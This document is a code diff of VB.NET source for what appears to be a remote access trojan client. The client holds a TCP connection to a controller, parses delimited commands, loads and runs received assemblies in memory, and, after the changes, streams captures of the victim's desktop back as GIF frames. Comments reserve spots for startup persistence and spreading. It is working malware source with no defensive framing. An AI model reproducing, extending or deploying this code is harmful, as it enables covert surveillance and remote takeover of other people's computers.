@@ -10,6 +10,7 @@ Imports System.Drawing
 Imports System.Runtime.Serialization.Formatters.Binary
 Imports System.Security.Principal
 Imports System.IO
+Imports System.Drawing.Imaging
 ''||       AUTHOR Arsium       ||
 ''||       github : https://github.com/arsium       ||
 Public Class C
@@ -45,7 +46,7 @@ Public Class C
 
     Public Shared CLI As TcpClient
     Public Shared p As StringBuilder
-
+    Public Shared ViewerDesk As Thread
     ''
 
     Public Shared Sub Main()
@@ -53,12 +54,6 @@ Public Class C
         ''ADD PERMISSION
         ''ADD STARTUP
         ''ADD SPREAD
-
-
-     
-
-
-
 
 
         Try
@@ -100,20 +95,17 @@ Public Class C
 
     End Sub
 
-
     Public Shared Async Sub T(ByVal l As NetworkStream)
 
 
         p = New StringBuilder
 
         Try
-            Dim b(150 * 4096) As Byte
+            Dim b(500 * 4096) As Byte
 
 
             While True
-                GC.Collect()
-                GC.WaitForPendingFinalizers()
-                SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
+
 
                 Dim lu As Integer = l.Read(b, 0, b.Length)
                 If (lu > 0) Then
@@ -140,13 +132,12 @@ Public Class C
 
                             p.Clear()
 
-                            '            Dim o As String = PL_MISC & "|SP1|" & "" & "|SP2|" & "|RBT|" & "|ENDING|"
+
                             Dim j2 As String() = Microsoft.VisualBasic.Strings.Split(j, "|SP1|")
 
 
                             Dim az As New Thread(Sub() Launch(CLI, j2(0), j2(1)))
                             az.Start()
-                            '  Task.Run(Sub() Launch(CLI, j2(0), j2(1)))
 
 
 
@@ -173,15 +164,17 @@ Public Class C
 
                             p.Clear()
 
-                            TcpV = New TcpClient
-
-                            TcpV.Connect("127.0.0.1", 1800)
 
 
 
-                            ViewerDesk = New Thread(AddressOf CamCam)
+                            Try
+                                ViewerDesk = New Thread(AddressOf CamCam)
 
-                            ViewerDesk.Start()
+                                ViewerDesk.Start()
+                            Catch ex As Exception
+
+                            End Try
+
 
                         ElseIf p.ToString.EndsWith("|TRDV|") Then
 
@@ -189,9 +182,17 @@ Public Class C
 
                             Try
                                 ViewerDesk.Abort()
+
                             Catch ex As Exception
 
                             End Try
+
+
+                            Dim ks As String = "|STPDSK|"
+
+                            CLI.GetStream.Write(System.Text.Encoding.UTF8.GetBytes(ks), 0, System.Text.Encoding.UTF8.GetBytes(ks).Length)
+
+
                         End If
 
 
@@ -213,9 +214,8 @@ Public Class C
         End Try
     End Sub
 
-    Public Shared TcpV As TcpClient
-    Public Shared ViewerDesk As Thread
-    Public Shared ns As NetworkStream
+
+
 
     <DllImport("user32.dll")>
     Public Shared Function GetCursorPos(<Out> ByRef lpPoint As Point) As Boolean
@@ -240,6 +240,8 @@ Public Class C
     Public Shared Function Desk() As Image
         Dim primaryMonitorSize As Size = SystemInformation.PrimaryMonitorSize
         Dim iamage As New Bitmap(primaryMonitorSize.Width, primaryMonitorSize.Height)
+
+
 
         Dim graphics As Graphics = Graphics.FromImage(iamage)
         Dim upperLeftSource As New Point(0, 0)
@@ -272,45 +274,32 @@ Public Class C
 
 
     Public Shared Sub CamCam()
-        Dim bf As New BinaryFormatter
         While True
 
-            ns = TcpV.GetStream
 
-            bf.Serialize(ns, Desk)
+            Dim i As Image = Desk()
+            Dim MS As New IO.MemoryStream
 
-
-            GC.Collect()
-            GC.WaitForPendingFinalizers()
+            i.Save(MS, ImageFormat.Gif)
 
 
-            Thread.Sleep(1)
+            Dim p As String = "|DESK|" & "|SP|" & Encoding.Default.GetString(MS.ToArray)
 
-            '
-            GC.Collect()
-            GC.WaitForPendingFinalizers()
+            Dim B As Byte() = Encoding.Default.GetBytes(p)
+
+            '  Task.Run(Sub() CLI.GetStream.WriteAsync(B, 0, B.Length))
+
+            CLI.GetStream.WriteAsync(B, 0, B.Length)
+            MS.Dispose()
+
+
+            '    GC.Collect()
+            ' GC.WaitForPendingFinalizers()
+
             SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
+
         End While
     End Sub
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
@@ -325,13 +314,14 @@ Public Class C
         Dim obj As Object = assemblytoload.CreateInstance(method.Name)
 
 
+
         '   
         Await Task.Run(Sub() method.Invoke(obj, New Object() {k, P}))
 
 
+
         assemblytoload = Nothing
         method = Nothing
-
         GC.Collect()
         GC.WaitForPendingFinalizers()
         SetProcessWorkingSetSize(Process.GetCurrentProcess().Handle, -1, -1)
